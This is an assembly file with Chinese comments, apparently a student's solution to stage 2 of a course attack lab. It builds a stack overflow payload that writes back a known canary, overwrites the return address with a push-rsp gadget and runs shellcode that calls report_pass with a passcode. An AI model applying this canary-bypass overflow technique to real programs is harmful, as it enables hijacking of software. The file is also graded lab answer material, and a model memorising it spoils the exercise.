# attack2.s — 阶段 2：有栈金丝雀（本机版）
#
# 本机 attack2 的金丝雀是编译进 .data 的固定常数 0x1122334455667700
# （每个学号都一样，objdump -s -j .data attack2 能看到）。
# 服务器那份是另一个值（见 remote/attack2.s）。
#
# 输入布局（共 405 字节）：
#   偏移 0..359    360 字节填充 0x67，写到 chat_turn 的金丝雀之前
#   偏移 360..367  金丝雀（小端写回原值，内存字节 00 77 66 55 44 33 22 11）
#   偏移 368..375  保存的 %rbp（8 字节填充）
#   偏移 376..383  覆盖返回地址 → 0x48b38b（push %rsp; ret）
#   偏移 384..404  shellcode
#
# 缓冲区在 %rbp-0x170，金丝雀在 %rbp-0x8：距离 0x168 = 360 字节；
# 返回地址在 %rbp+8，即输入偏移 376。
# chat_turn 返回前会做 sub %fs:0x28 检查，所以金丝雀必须一字不差写回。
#
# 0x48b38b 处是 push %rsp; ret：ret 进入时 %rsp = %rbp+0x10（= 384），
# push 后 ret 落到 shellcode 上。
#
# shellcode：%rdi = 2（阶段号），%rsi = 口令，ret 进入 report_pass。

.text
.fill 360, 1, 0x67          # 0..359：填充到金丝雀之前
.quad 0x1122334455667700    # 360：本机金丝雀（内存字节 00 77 66 55 44 33 22 11）
.fill 8, 1, 0x67            # 368：保存的 %rbp
.quad 0x48b38b              # 376：返回地址 = push %rsp; ret

# 384：shellcode
push $0x1938000             # report_pass 的地址
movl $2, %edi               # 阶段号 2
movabs $0xdc22eaf2a8fe9994, %rsi    # 口令
ret                         # 进入 report_pass
